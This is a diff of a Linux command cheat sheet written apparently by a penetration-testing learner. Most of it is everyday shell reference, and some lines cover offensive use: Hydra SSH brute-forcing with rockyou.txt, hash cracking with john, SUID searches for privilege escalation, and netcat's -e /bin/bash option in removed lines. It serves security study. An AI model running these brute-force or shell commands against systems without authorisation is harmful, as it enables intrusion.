@@ -3,154 +3,95 @@
 ================================================================================
 
 --------------------------------------------------------------------------------
+HELP & DOCUMENTATION
+--------------------------------------------------------------------------------
+
+  man <command>                  Display the full manual for a command (e.g. man hydra)
+  info <command>                 Display online help information about a command
+  whatis <command>               Search for complete words and find manual pages
+  apropos <keyword>              Find manual pages related to a keyword
+  type <command>                 Show the type and location of a command
+                                 (alias, builtin, or binary)
+  alias ll='ls -la'              Define an abbreviation for a long command
+  unalias <name>                 Delete an abbreviation defined using alias
+
+--------------------------------------------------------------------------------
 BASIC FILE & DIRECTORY COMMANDS
 --------------------------------------------------------------------------------
 
-  .                              Current directory ( cp /media/cdrom/* .) copies all files in cdrom into current directory
-  ls                             List files in a directory
-  ls -lh <file>                  List with details, check file owner/permissions
-  ls -al                         List all files including hidden, with details
   pwd                            Show current directory path
   cd <directory>                 Change directory
+  cd -                           Jump back to previous directory (instead of cd .. cd ..)
+  cd ~                           Go to home directory
+  .                              Current directory (e.g. cp /media/cdrom/* . copies files here)
+  ls                             List files in a directory
+  ls -l                          Long format — permissions, owner, size, date
+  ls -a                          Show all files including hidden (dot files)
+  ls -la                         Full details including hidden files (most common)
+  ls -lh <file>                  Human-readable sizes (KB, MB, GB)
+  ls -lt                         Sort by time — newest first
+  ls -lS                         Sort by size — largest first
+  ls -R                          Recursive — list all subdirectory contents
+  ls -d */                       Show only directories
   mkdir <foldername>             Create a new folder
+  mkdir dir1/dir2                Create nested directories
+  mkdir -p ./bee{a,b}/{x,y}     Create multiple folder combinations at once
+  touch <file>                   Create an empty file or update its timestamp
+  touch file{a..10}.txt          Create multiple files at once
+  cp <source> <destination>      Copy files or directories
+  mv <source> <destination>      Move or rename files/directories
   rm <file>                      Delete a file
   rm -r <folder>                 Delete a folder and its contents
-  cp <source> <destination>      Copy files or directories
-  mv <source> <destination>      Move or RENAME files/directories
-  gunzip <file>                  Extract/decompress a .gz file
-  man <command>                  Display the manual for a command (e.g. man hydra)
-  sudo chown kali:kali .         Fix ownership so your kali user can access and modify the directory
-  exec bash                      Refreshes shell
-  mkdir dir1/dir2                Making multiple directories
-  rm -rf                         Recursive so deleting everything inside (rm -rf dir1)
-  touch <file>                   Quickly make a file or document
-  echo "text" > file             Overwrite with text
-  echo "text" >> file            Append text, add onto it
-  tee                            Takes input and writes it to a file
-  -a                             Flag means append add to existing instead of overwriting
-  diff                           Shows the difference of a file (diff file1.txt file2.txt)
-  hostname -I                    Lists ip addresses
-  cd -                           do this instead of cd .. cd ..
-  mkdir -p ./bee{a,b}/{x,y}      create multiple combinations of folders
-  touch file{a..10}.txt          create multiple files
-  history 5                      print last 5 commands
-  chsh -s $(which zsh)           set Zsh as your permanent default shell
-  gedit                          Open file in cool notes
-  ;                              add shorter commands (cd; ls; pwd)
-  \                              if too long type cat \ /etc/passwd
-  "                              use for strings with spaces like grep "justin kloski"
+  rm -rf <folder>                Force delete everything inside recursively (dangerous)
+  rmdir <folder>                 Delete an empty directory
+  diff file1.txt file2.txt       Show differences between two files
+  file <file>                    Display the type of data in a file
+  hostname -I                    List all IP addresses quickly
+  exec bash                      Refresh current shell session
+  history 5                      Print last 5 commands
+  !!                             Repeat the previous command
+  !1                             Run command number 1 from history
+  nohup ./program &              Keep a program running after closing the terminal
+  ;                              Chain short commands (cd /tmp; ls; pwd)
+  \                              Break long commands across lines (cat \ /etc/passwd)
+  "text with spaces"             Use quotes for strings with spaces (grep "justin kloski")
+  nano <( curl link)             quick way to download file and edit it
 --------------------------------------------------------------------------------
-Symbolic link
+SYMBOLIC LINKS
 --------------------------------------------------------------------------------
-Example 1:
-  Create a symlink named take-the-command-challenge
-  that points to the EXISTING file tmp/files/take-the-command-challenge
 
+  ln -s <target> <linkname>      Create a symbolic link
+
+  Example:
     ln -s tmp/files/take-the-command-challenge take-the-command-challenge
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^
           TARGET (existing file, points TO this)   LINKNAME (new shortcut)
 
-  Result: typing take-the-command-challenge now opens
-          tmp/files/take-the-command-challenge
+  Result: typing take-the-command-challenge opens tmp/files/take-the-command-challenge
+
 --------------------------------------------------------------------------------
-VIEWING FILE CONTENT — HEAD & TAIL
---------------------------------------------------------------------------------
-
-  These commands let you quickly view parts of files without opening them fully.
-  Extremely useful for logs, large files, and pipelines.
-
-  HEAD — View the beginning of a file
-  -----------------------------------
-
-  head <file>                  Show first 10 lines (default)
-  head -n 5 <file>             Show first 5 lines
-  head -20 <file>              Show first 20 lines (shorthand)
-  
-  Example:
-  head access.log              Quickly preview a log file
-
-  TAIL — View the end of a file
-  ------------------------------
-
-  tail <file>                  Show last 10 lines (default)
-  tail -n 5 <file>             Show last 5 lines
-  tail -20 <file>              Show last 20 lines
-
-  FOLLOW MODE (LIVE LOGS)
-  ------------------------
-
-  tail -f <file>               Follow file in real-time (live updates)
-                               Great for watching logs as they update
-
-  Example:
-  tail -f /var/log/syslog
-
-  USING WITH PIPES
-  -----------------
-
-  cat file.txt | tail -5       Show last 5 lines of file
-  grep "error" log.txt | tail  Show last matching error entries
-  dmesg | tail                 Show most recent kernel messages
-
-  PRACTICAL USE CASES
-  --------------------
-
-  tail -f access.log           Monitor web server traffic live
-  tail -n 50 auth.log          Check last 50 authentication attempts
-  ps aux | tail                See last processes in long output
-
-  TIP
-  ----
-
-  You usually DON'T need cat with tail/head:
-  tail -5 file.txt             (better than: cat file.txt | tail -5)
---------------------------------------------------------------------------------
-FINDING COMMANDS & PATHS
+FINDING FILES & COMMANDS
 --------------------------------------------------------------------------------
 
-  These commands help you locate where programs are installed and how they are run.
-  Useful for troubleshooting, scripting, and understanding what’s actually executing.
-
-  WHICH — Find the path of a command
-  -----------------------------------
-
-  which <command>              Show the full path of the executable
+  find / -name "*.conf"          Find all .conf files on the system
+  find / -name "pass*"           Find files starting with "pass"
+  find / -perm -4000 2>/dev/null Find SUID binaries (potential privesc)
+  locate <filename>              Find files using a periodically updated database
+                                 (database created by updatedb)
+  updatedb                       Manually update the locate database
+  which <command>                Show full path of a command in your PATH
+  whereis <command>              Show binary, source, and man page locations
+  type <command>                 Show if command is alias, builtin, or file path
+  command -v <command>           Reliable command resolution (good for scripts)
+  echo $PATH                     Show directories searched when running commands
 
   Examples:
-  which python3                /usr/bin/python3
-  which nmap                   /usr/bin/nmap
-  which bash                   /usr/bin/bash
+    which python3                /usr/bin/python3
+    whereis nmap                 nmap: /usr/bin/nmap /usr/share/nmap
+    type ls                      ls is /usr/bin/ls
+    type ll                      ll is an alias for ls -la
 
-  Notes:
-  - Only finds commands available in your PATH
-  - If nothing prints, the command is not installed or not in PATH
-
-  TYPE — Identify how a command is interpreted
-  --------------------------------------------
-
-  type <command>               Show if command is alias, builtin, or file
-
-  Examples:
-  type cd                      cd is a shell builtin
-  type ls                      ls is /usr/bin/ls
-  type ll                      ll is an alias for ls -la
-
-  Useful for detecting aliases or overridden commands
-
-  WHEREIS — Locate binary, source, and manual pages
-  --------------------------------------------------
-
-  whereis <command>            Show multiple locations related to a command
-
-  Example:
-  whereis nmap                 nmap: /usr/bin/nmap /usr/share/nmap
-
-  Shows:
-  - Binary location
-  - Source files (if present)
-  - Man pages
-
-  COMMAND -V — Detailed command info
+COMMAND -V — Detailed command info
   ----------------------------------
 
   command -v <command>         Show how the shell resolves a command
@@ -177,208 +118,154 @@ FINDING COMMANDS & PATHS
   type python                  See if python is aliased or real binary
   whereis bash                 Find bash binary and man page
   echo $PATH                   Debug why a command isn’t found
---------------------------------------------------------------------------------
-FLAGS — COMMON FLAGS EXPLAINED
---------------------------------------------------------------------------------
-
-  Flags (also called options or switches) modify how a command behaves.
-  They follow the command and start with - (single letter) or -- (full word).
-  Multiple flags can be combined: ls -la is the same as ls -l -a
-
-  LS FLAGS
-  --------
-
-  ls -l                  Long format — shows permissions, owner, size, and date
-                         Output example:
-                         -rwxr-xr--  1  kali  kali  4096  Mar 10  file.sh
-                         (permissions / links / owner / group / size / date / name)
-
-  ls -a                  All files — shows hidden files (files starting with a dot)
-                         Example: .bashrc  .ssh  .config  would normally be invisible
-
-  ls -la                 Combines -l and -a — full details including hidden files
-                         Most commonly used ls command in security work
-
-  ls -lh                 Human-readable sizes — shows KB, MB, GB instead of raw bytes
-                         Example: 4.0K instead of 4096
-
-  ls -lt                 Sort by time — newest files shown first
-                         Useful for seeing what was recently created or modified
-
-  ls -lS                 Sort by size — largest files shown first
-
-  ls -R                  Recursive — lists contents of all subdirectories too
-
-  ls -d */               Show only directories in current location
-
-  NMAP FLAGS
-  ----------
-
-  -sn                    Ping sweep only — no port scan, just find live hosts
-  -sT                    TCP Connect Scan — full handshake, more detectable
-  -sS                    SYN Scan — stealth scan, sends SYN but never completes handshake
-  -sU                    UDP Scan — scans UDP ports (slower than TCP)
-  -sV                    Version detection — identifies what software is running on open ports
-  -O                     OS detection — tries to identify the target operating system
-  -A                     Aggressive — enables OS detection, version detection, scripts, traceroute
-  -p <port>              Scan a specific port or range  (e.g. -p 80  or  -p 1-1000)
-  -p-                    Scan ALL 65535 ports
-  --open                 Only show open ports in results
-  -oN <file>             Save output in normal readable format to a file
-  -oG <file>             Save output in greppable format (easy to parse with grep)
-  -T4                    Speed template — T4 is fast, T5 is fastest, T1 is slowest/stealthy
-  -v                     Verbose — show more output while scanning
-  -vv                    Very verbose — even more detail during scan
-  --script <name>        Run a specific NSE script against the target
-
-  HYDRA FLAGS
-  -----------
-
-  -l <username>          Single known username
-  -L <file>              List of usernames from a file
-  -p <password>          Single known password
-  -P <file>              List of passwords (wordlist) from a file
-  -t <number>            Number of parallel threads  (e.g. -t 4)
-  -f                     Stop as soon as one valid login is found
-  -v                     Verbose output
-  -V                     Very verbose — shows every attempt (slow but useful for debugging)
-  -s <port>              Specify a custom port if the service is not on default
-  -o <file>              Save found credentials to a file
-
-  NETCAT FLAGS
-  ------------
-
-  -l                     Listen mode — wait for an incoming connection
-  -v                     Verbose — show connection details
-  -n                     No DNS — skip hostname resolution, use IPs only
-  -p <port>              Specify the port to listen on or connect to
-  -e <program>           Execute a program on connect  (e.g. -e /bin/bash for shell)
-  -u                     UDP mode instead of default TCP
-
-  GOBUSTER FLAGS
-  --------------
-
-  dir                    Mode — directory and file brute-forcing
-  -u <URL>               Target URL
-  -w <wordlist>          Wordlist to use for brute-forcing
-  -t <number>            Threads — how many requests to run at once  (default 10)
-  -x <extensions>        File extensions to look for  (e.g. -x php,html,txt)
-  -o <file>              Save output to a file
-  -q                     Quiet — only show results, hide progress bar
-  --status-codes <codes> Only show specific HTTP status codes  (e.g. 200,301)
-
-  CHMOD FLAGS
-  -----------
-
-  -R                     Recursive — apply permission change to folder and all contents
-                         Example: chmod -R 755 /var/www/html
-
-  GENERAL FLAGS USED ACROSS MANY COMMANDS
-  ----------------------------------------
-
-  -r  or  -R             Recursive — applies command to all files and subfolders
-  -f                     Force — skip confirmation prompts, override errors
-  -v                     Verbose — show what the command is doing step by step
-  -h                     Human-readable — show sizes in KB/MB/GB
-  -n                     Number — (in grep: show line numbers, in head/tail: set count)
-  -i                     Case-insensitive — ignore uppercase/lowercase differences
-  -o                     Output — send results to a file
-  -q                     Quiet — suppress output, run silently
-  -e                     Execute or expression — run a specific command or pattern
-  -d                     Directory — target a directory specifically
-  -p                     Port — specify a port number
-  -u                     User — specify a username
-  -s                     Silent / stealth depending on the tool
 
 --------------------------------------------------------------------------------
-WILDCARDS — PATTERN MATCHING
+VIEWING FILE CONTENT
 --------------------------------------------------------------------------------
 
-  Wildcards are special characters that represent one or more unknown characters.
-  They let you match multiple files or strings without typing each name out.
-  They are used with commands like ls, cp, mv, rm, grep, find, and many others.
+  cat <file>                     Print entire file to terminal
+  less <file>                    Scroll through file (b to go back, q to quit)
+  more <file>                    Display file one page at a time (forward only)
+  head <file>                    Show first 10 lines (default)
+  head -n 5 <file>               Show first 5 lines
+  tail <file>                    Show last 10 lines (default)
+  tail -n 5 <file>               Show last 5 lines
+  tail -f <file>                 Follow file live — great for watching logs in real time
+  nl <file>                      Number all non-blank lines and print to output
+  tac <file>                     Print file in reverse (last line first)
 
-  *   ASTERISK — Match anything (zero or more characters)
-  -------------------------------------------------------
+  Examples:
+    tail -f /var/log/syslog      Watch syslog live
+    tail -n 50 auth.log          Check last 50 authentication attempts
+    head access.log              Preview top of a log file
+    dmesg | tail                 Most recent kernel messages
 
-  The most commonly used wildcard. Matches any number of any characters.
+USING WITH PIPES
+  -----------------
 
-  ls *.txt                    List all files ending in .txt         ***********
-  ls scan*                    List all files starting with "scan"
-  ls *2024*                   List all files with "2024" anywhere in the name
-  rm *.log                    Delete all .log files in current directory
-  cp *.py /backup/            Copy all Python scripts to /backup/
-  cat *.txt                   Print contents of every .txt file
-  mv report* /archive/        Move all files starting with "report" to /archive/
+  cat file.txt | tail -5       Show last 5 lines of file
+  grep "error" log.txt | tail  Show last matching error entries
+  dmesg | tail                 Show most recent kernel messages
 
-  ?   QUESTION MARK — Match exactly one character
-  ------------------------------------------------
+  PRACTICAL USE CASES
+  --------------------
 
-  Matches any single character. Useful when you know the length but not exact name.
+  tail -f access.log           Monitor web server traffic live
+  tail -n 50 auth.log          Check last 50 authentication attempts
+  ps aux | tail                See last processes in long output
 
-  ls file?.txt                Matches file1.txt, file2.txt, fileA.txt — NOT file10.txt
-  ls scan_??_2024.txt         Matches scan_01_2024.txt, scan_AB_2024.txt
-  rm log?.txt                 Deletes log1.txt, log2.txt etc but NOT log10.txt
-  ls ?.sh                     Lists all .sh files with a single character name (e.g. a.sh)
-
-  []  BRACKETS — Match one character from a set
-  ----------------------------------------------
-
-  Matches exactly one character from the set defined inside the brackets.
-
-  ls file[123].txt            Matches file1.txt, file2.txt, file3.txt only
-  ls [abc]*.sh                Matches any .sh file starting with a, b, or c
-  ls scan[0-9].txt            Matches scan0.txt through scan9.txt
-  ls [A-Z]*.txt               Matches any .txt file starting with an uppercase letter
-  ls [!a]*.txt                The ! means NOT — matches files NOT starting with a
-
-  {}  CURLY BRACES — Match specific options (brace expansion)
-  ------------------------------------------------------------
-
-  Not technically a wildcard but works similarly — matches exact listed patterns.
-
-  cp file.{txt,py,sh} /backup/        Copy file.txt, file.py, and file.sh at once
-  touch scan_{1,2,3}.txt              Create scan_1.txt, scan_2.txt, scan_3.txt
-  ls *.{jpg,png,gif}                  List all image files of those three types
-  mv {old,new}_config.txt /etc/       Move both files at once
-
-  ~   TILDE — Home directory shortcut
-  ------------------------------------
-
-  Not a wildcard exactly but a special character worth knowing alongside them.
-
-  cd ~                        Go to your home directory
-  ls ~/Desktop                List files on your Desktop
-  cp file.txt ~/Documents/    Copy a file to your Documents folder
-
-  COMBINING WILDCARDS
-  -------------------
-
-  ls *.???                    All files with a 3-character extension
-  ls [0-9]*_scan.txt          Files starting with a number and ending in _scan.txt
-  find / -name "*.conf"       Find all .conf files anywhere on the system
-  find / -name "pass*"        Find any file starting with "pass"
-  grep "error" *.log          Search for "error" across all log files at once
-  rm temp_?.txt               Remove temp_1.txt, temp_2.txt etc but not temp_10.txt
-
-  WILDCARD SAFETY WARNING
-  -----------------------
-
-  Be careful using wildcards with rm — there is no undo in Linux.
-
-  rm *.txt                    Deletes ALL .txt files — double check before running
-  rm *                        Deletes EVERYTHING in the current directory
-  rm -rf *                    Deletes everything including folders — extremely dangerous
-
-  Tip: Run ls with your wildcard first to preview what will be matched before deleting.
-  Example:  ls *.log    — check the output looks right, then run:   rm *.log
+  TIP: You usually don't need cat with head/tail:
+    tail -5 file.txt             (better than: cat file.txt | tail -5)
 
 --------------------------------------------------------------------------------
-FILE PERMISSIONS — CHMOD
+PROCESSING FILES
 --------------------------------------------------------------------------------
 
-  chmod changes the read, write, and execute permissions on files and directories.
-  Permissions control who can read, modify, or run a file.
+  cut -d: -f1 <file>             Extract specific columns from lines
+                                 (-d sets delimiter, -f sets field number)
+  grep "pattern" <file>          Search for a pattern in a file
+  grep -i "pattern" <file>       Case-insensitive search
+  grep -n "pattern" <file>       Show line numbers with matches
+  sort <file>                    Sort lines in a file alphabetically
+  uniq <file>                    Remove duplicate consecutive lines from a file
+  wc -l <file>                   Count lines in a file
+  wc -w <file>                   Count words in a file
+  tr 'a-z' 'A-Z' < file         Substitute characters (lowercase to uppercase)
+  sed 's/old/new/g' <file>       Find and replace text in a file
+  paste file1 file2              Concatenate corresponding lines from multiple files
+  split -l 100 file.txt          Split file into chunks of 100 lines each
+  fold -w 80 <file>              Wrap long lines to fit 80 character width
+  expand <file>                  Convert all tabs to spaces
+  patch file.txt changes.patch   Update a file using a diff/patch file
+  dd if=<input> of=<output>      Copy blocks of data (also used to copy device data)
+  strings <file>                 Extract readable strings from a binary
+  diff file1.txt file2.txt       Compare two files and show differences
+
+  Compressed file viewing:
+  zcat <file.gz>                 Display a compressed file without decompressing
+  zless <file.gz>                View compressed file one page at a time (b to go back)
+  zmore <file.gz>                View compressed file one page at a time (forward only)
+
+--------------------------------------------------------------------------------
+REDIRECTS & PIPES
+--------------------------------------------------------------------------------
+
+  >     Output redirect — send output to a file (OVERWRITES existing content)
+  >>    Append redirect — add output to the END of a file
+  <     Input redirect  — feed a file into a command as input
+  |     Pipe            — send output of one command directly into another
+
+  OUTPUT REDIRECT  >
+  ------------------
+  echo "hello" > file.txt               Create or overwrite file.txt
+  nmap -sV 192.168.1.1 > scan.txt       Save nmap output to a file
+  ls -la > listing.txt                  Save directory listing to a file
+
+  APPEND REDIRECT  >>
+  --------------------
+  echo "second line" >> file.txt        Add a line without overwriting
+  nmap -sV 192.168.1.2 >> scan.txt      Add more results to an existing file
+
+  INPUT REDIRECT  <
+  ------------------
+  john --wordlist=rockyou.txt < hashes.txt    Feed hashes file into john
+  mysql -u root -p < backup.sql               Run SQL commands from a file
+  wc -l < targets.txt                         Count lines in a file
+
+  PIPE  |
+  -------
+  cat file.txt | grep "password"        Find lines containing "password"
+  ps aux | grep apache                  Find running apache processes
+  nmap -sV 192.168.1.1 | grep open      Show only open ports
+  cat /etc/passwd | cut -d: -f1         Extract just the usernames
+  cat passwords.txt | wc -l             Count lines in a file
+
+  CHAINING EXAMPLES
+  -----------------
+  cat /etc/passwd | grep "/bin/bash" | cut -d: -f1 > shell_users.txt
+  nmap -sn 192.168.1.0/24 | grep "report" | awk '{print $5}' > live_hosts.txt
+  strings malware.exe | grep -i "http" > urls.txt
+  cat access.log | grep "200" | awk '{print $1}' | sort | uniq -c | sort -rn
+
+  SPECIAL REDIRECTS
+  -----------------
+  2>/dev/null          Suppress error messages — send errors to nowhere
+  2>&1                 Redirect errors to the same place as normal output
+  tee <file>           Show output in terminal AND save to file simultaneously
+
+  find / -perm -4000 2>/dev/null                       Find SUID files, hide errors
+  nmap -sV 192.168.1.0/24 2>/dev/null | tee out.txt   Scan, suppress errors, save output
+  hydra -L users.txt -P rockyou.txt ssh://192.168.1.1 2>&1 | tee results.txt
+
+--------------------------------------------------------------------------------
+TEXT OUTPUT & WRITING TO FILES
+--------------------------------------------------------------------------------
+
+  echo "text" > file             Overwrite file with text
+  echo "text" >> file            Append text to file
+  tee <file>                     Write input to both terminal and a file
+  tee -a <file>                  Append mode with tee
+
+--------------------------------------------------------------------------------
+ARCHIVING & COMPRESSING
+--------------------------------------------------------------------------------
+
+  tar -cvf archive.tar /dir      Create a tar archive
+  tar -xvf archive.tar           Extract a tar archive
+  tar -czvf archive.tar.gz /dir  Create a compressed tar.gz archive
+  tar -xzvf archive.tar.gz       Extract a tar.gz archive
+  gzip <file>                    Compress a file with GNU Zip
+  gunzip <file>                  Decompress a .gz file
+  compress <file>                Compress a file (older format)
+  uncompress <file>              Decompress a .Z compress file
+  cpio                           Copy files to and from an archive
+
+  Example:
+    sudo gunzip /usr/share/wordlists/rockyou.txt.gz    Decompress rockyou wordlist
+
+--------------------------------------------------------------------------------
+FILE PERMISSIONS — CHMOD & CHOWN
+--------------------------------------------------------------------------------
 
   Every file has three permission groups:
     Owner    The user who owns the file
@@ -390,153 +277,165 @@ FILE PERMISSIONS — CHMOD
     w = write    (value: 2)
     x = execute  (value: 1)
 
-  Each digit in the permission number is the sum of r+w+x for that group:
+  Each digit = sum of r+w+x for that group:
     7 = rwx  (4+2+1)   full access
     6 = rw-  (4+2)     read and write
     5 = r-x  (4+1)     read and execute
     4 = r--  (4)       read only
-    0 = ---            no access at all
+    0 = ---            no access
 
   NUMERIC MODE
   ------------
-
-  chmod 777 <file>               rwxrwxrwx — everyone has full access (dangerous)    *********
+  chmod 777 <file>               rwxrwxrwx — everyone full access (dangerous)
   chmod 755 <file>               rwxr-xr-x — owner full, others read/execute
-  chmod 700 <file>               rwx------ — owner only, no one else can access
+  chmod 700 <file>               rwx------ — owner only
   chmod 644 <file>               rw-r--r-- — owner read/write, others read only
-  chmod 600 <file>               rw------- — owner read/write only (good for keys)
+  chmod 600 <file>               rw------- — owner read/write only (good for SSH keys)
   chmod 400 <file>               r-------- — read only for owner (sensitive files)
 
   SYMBOLIC MODE
   -------------
-
-  chmod +x <file>                Add execute permission for everyone
-  chmod -x <file>                Remove execute permission for everyone
+  chmod +x <file>                Add execute for everyone
+  chmod -x <file>                Remove execute for everyone
   chmod u+x <file>               Add execute for owner only
   chmod g+w <file>               Add write for group only
   chmod o-r <file>               Remove read from others
-  chmod a+x <file>               Add execute for all (owner + group + others)
-  chmod -R 755 /var/www/html     Apply permissions recursively to folder and contents
+  chmod a+x <file>               Add execute for all
+  chmod -R 755 /var/www/html     Apply permissions recursively
 
-  EXAMPLES
-  --------
-
-  chmod +x exploit.py            Make a script executable before running it
-  chmod 600 id_rsa               Lock down an SSH private key (required by SSH)
-  chmod 644 index.html           Web file — owner edits it, server reads it
-  chmod 755 /usr/local/bin/tool  Make a tool executable by all users on the system
+  CHOWN — CHANGE OWNERSHIP
+  ------------------------
+  chown user:group <file>        Change owner and group
+  chown kali:kali .              Fix ownership of current directory
+  chown -R user:group /dir       Recursively change ownership of a folder
 
   CHECKING PERMISSIONS
   --------------------
-
-  ls -la <file>                  Show permissions for a file
-  stat <file>                    Show detailed file info including permissions
+  ls -la <file>                  Show permissions
+  stat <file>                    Detailed file info including permissions
 
   READING PERMISSION OUTPUT
   -------------------------
-
-  When you run ls -la you will see output like:
   -rwxr-xr--  1  neo  neo  4096  Feb 26  file.sh
-
-    -           File type  (- = file,  d = directory,  l = symlink)
-    rwx         Owner permissions  (read, write, execute)
-    r-x         Group permissions  (read, no write, execute)
-    r--         Others permissions (read only)
+   ^           File type (- = file, d = directory, l = symlink)
+    ^^^        Owner permissions (read, write, execute)
+       ^^^     Group permissions (read, no write, execute)
+          ^^^  Others permissions (read only)
 
 --------------------------------------------------------------------------------
-REDIRECTS & PIPES
+WILDCARDS — PATTERN MATCHING
 --------------------------------------------------------------------------------
 
-  >     Output redirect — send output to a file (overwrites existing content)
-  >>    Append redirect — add output to the end of a file            ************
-  <     Input redirect  — feed a file into a command as input
-  |     Pipe            — send output of one command directly into another
+  *   ASTERISK — Match anything (zero or more characters)
+  -------------------------------------------------------
+  ls *.txt                    List all .txt files
+  ls scan*                    List files starting with "scan"
+  rm *.log                    Delete all .log files
+  cp *.py /backup/            Copy all Python scripts to /backup/
 
-  OUTPUT REDIRECT  >
-  ------------------
+  ?   QUESTION MARK — Match exactly one character
+  ------------------------------------------------
+  ls file?.txt                Matches file1.txt, file2.txt — NOT file10.txt
+  rm log?.txt                 Deletes log1.txt, log2.txt etc
 
-  Sends command output into a file. OVERWRITES the file if it already exists.
+  []  BRACKETS — Match one character from a set
+  ----------------------------------------------
+  ls file[123].txt            Matches file1.txt, file2.txt, file3.txt only
+  ls scan[0-9].txt            Matches scan0.txt through scan9.txt
+  ls [A-Z]*.txt               Files starting with uppercase letter
+  ls [!a]*.txt                NOT starting with a
 
-  echo "hello" > file.txt               Create file.txt containing "hello"
-  nmap -sV 192.168.1.1 > scan.txt       Save nmap output to a file
-  ls -la > listing.txt                  Save directory listing to a file
-  cat /etc/passwd > passwords.txt       Copy file contents into a new file
+  {}  CURLY BRACES — Brace expansion
+  ------------------------------------
+  cp file.{txt,py,sh} /backup/        Copy multiple extensions at once
+  touch scan_{1,2,3}.txt              Create scan_1.txt, scan_2.txt, scan_3.txt
+  ls *.{jpg,png,gif}                  List all image files
 
-  APPEND REDIRECT  >>
-  --------------------
+  COMBINING WILDCARDS
+  -------------------
+  ls *.???                    All files with a 3-character extension
+  find / -name "*.conf"       Find all .conf files on the system
+  grep "error" *.log          Search for "error" across all log files
 
-  Sends output to a file but ADDS to the end instead of overwriting.
-
-  echo "second line" >> file.txt        Add a line without overwriting
-  nmap -sV 192.168.1.2 >> scan.txt      Add more results to an existing scan file
-  echo "found host" >> results.txt      Keep building a results file over time
-
-  INPUT REDIRECT  <
-  ------------------
-
-  Feeds the contents of a file into a command as input.
-
-  john --wordlist=rockyou.txt < hashes.txt     Feed hashes file into john
-  mysql -u root -p < backup.sql                Run SQL commands from a file
-  wc -l < targets.txt                          Count lines in a file
-
-  PIPE  |
-  -------
-
-  Takes output of one command and passes it directly into another.
-  One of the most powerful and commonly used features in Linux.
-
-  cat file.txt | grep "password"        Find lines containing "password"
-  ps aux | grep apache                  Find running apache processes
-  nmap -sV 192.168.1.1 | grep open      Show only open ports from nmap output
-  cat /etc/passwd | cut -d: -f1         Extract just the usernames
-  cat passwords.txt | wc -l             Count how many lines are in a file
-
-  CHAINING EXAMPLES
-  -----------------
-
-  cat /etc/passwd | grep "/bin/bash" | cut -d: -f1 > shell_users.txt
-  (find users with bash shell, extract usernames, save to file)
-
-  nmap -sn 192.168.1.0/24 | grep "report" | awk '{print $5}' > live_hosts.txt
-  (ping sweep, filter results, extract IPs, save to file)
-
-  strings malware.exe | grep -i "http" > urls.txt
-  (extract strings from a binary, filter for URLs, save to file)
-
-  cat access.log | grep "200" | awk '{print $1}' | sort | uniq -c | sort -rn
-  (find the most active IPs from a web server access log)
-
-  SPECIAL REDIRECTS
-  -----------------
-
-  2>/dev/null          Suppress error messages — send errors to nowhere  ***********
-  2>&1                 Redirect errors to the same place as normal output
-  tee <file>           Show output in terminal AND save to file simultaneously
-
-  find / -perm -4000 2>/dev/null                       Find SUID files, hide errors
-  nmap -sV 192.168.1.0/24 2>/dev/null | tee out.txt   Scan, suppress errors, save output
-  hydra -L users.txt -P rockyou.txt ssh://192.168.1.1 2>&1 | tee results.txt
+  WARNING: Run ls with wildcard first before using rm to preview matches.
+    ls *.log      (verify first)
+    rm *.log      (then delete)
 
 --------------------------------------------------------------------------------
 DISK & STORAGE
 --------------------------------------------------------------------------------
 
-  df                             Show disk space usage (filesystems)
+  df                             Show disk space on all mounted filesystems
+  df -h                          Human-readable disk space (GB/MB) !!!
   du -h                          Show directory/file sizes in human-readable form
-
+  du -sh /dir                    Total size of a specific directory
+  fdisk -l                       List all partitions on all drives
+  fdisk /dev/sda                 Partition a hard drive
+  mkfs.ext4 /dev/sdb1            Create a new ext4 filesystem
+  fsck /dev/sda1                 Check and repair a filesystem
+  mount /dev/sdb1 /mnt           Mount a device to a directory
+  umount /mnt                    Unmount a device
+  mkswap /dev/sdb2               Create a swap partition
+  swapon /dev/sdb2               Activate swap space
+  swapoff /dev/sdb2              Deactivate swap space
+  sync                           Write buffered data to disk
+  tty                            Display the device name for the current terminal
+  mknod                          Create a device file
+  fdformat                       Format a floppy disk (legacy)
+  lsblk -f                       See mounted drives
 --------------------------------------------------------------------------------
 SYSTEM INFORMATION & PROCESS MANAGEMENT
 --------------------------------------------------------------------------------
 
-  uname -a                       Display full system information
-  uptime                         Show how long the system has been running
-  whoami                         Display the current logged-in user
+  uname -a                       Full system and kernel information
+  uptime                         How long the system has been running
+  whoami                         Current logged-in user
+  id <username>                  Display user and group ID for a user
   ps aux                         Show all running processes
+  pstree                         Show parent-child process relationships
   top                            Real-time process viewer
   htop                           Interactive process viewer (more user-friendly)
+  free -h                        Show free and used memory in human-readable form
   kill <PID>                     Kill a process by its PID
   pkill <name>                   Kill a process by name
+  nice <command>                 Run a process with lower priority (nice mode)
+  bg                             Run an interrupted process in the background
+  fg                             Bring a background process to the foreground
+  ldd <program>                  Display shared libraries needed to run a program
+  printenv                       Display current environment variables
+  reboot                         Restart the computer
+  shutdown -h now                Shut down Linux immediately
+  halt                           Shut down and halt the computer
+
+--------------------------------------------------------------------------------
+DATES & TIMES
+--------------------------------------------------------------------------------
+
+  date                           Display the current date and time
+  date -s "2026-01-01 12:00"     Set a new date and time
+  cal                            Display a calendar for the current month
+  cal 2026                       Display a calendar for the full year
+  cal 6 2026                     Display calendar for June 2026
+
+--------------------------------------------------------------------------------
+PRINTING
+--------------------------------------------------------------------------------
+
+  lpr <file>                     Print a file to the default printer
+
+--------------------------------------------------------------------------------
+MANAGING USERS
+--------------------------------------------------------------------------------
+
+  whoami                         Show current user
+  id <username>                  Show user and group IDs
+  groups <username>              List groups a user belongs to
+  passwd                         Change your password
+  passwd <username>              Change another user's password (root only)
+  su <username>                  Switch to another user
+  su                             Switch to root (no argument = root)
+  chsh -s $(which zsh)           Change default shell to Zsh permanently
+  chsh -s $(which bash)          Change default shell to Bash
 
 --------------------------------------------------------------------------------
 NETWORKING COMMANDS
@@ -544,89 +443,58 @@ NETWORKING COMMANDS
 
   ifconfig                       Show network interfaces and IP addresses
   ip a                           Show IP addresses (modern alternative to ifconfig)
-  ping <IP>                      Send ICMP packets to test connectivity
+  hostname -I                    Display all IPs quickly
+  ping <IP>                      Test connectivity to a host
   netstat -tulnp                 Show open ports and listening services
   traceroute <IP>                Trace the route packets take to a host
-  nslookup <domain>              Get basic DNS information for a domain
-  dig <domain>                   Retrieve detailed DNS information
+  nslookup <domain>              Basic DNS lookup for a domain
+  dig <domain>                   Detailed DNS information
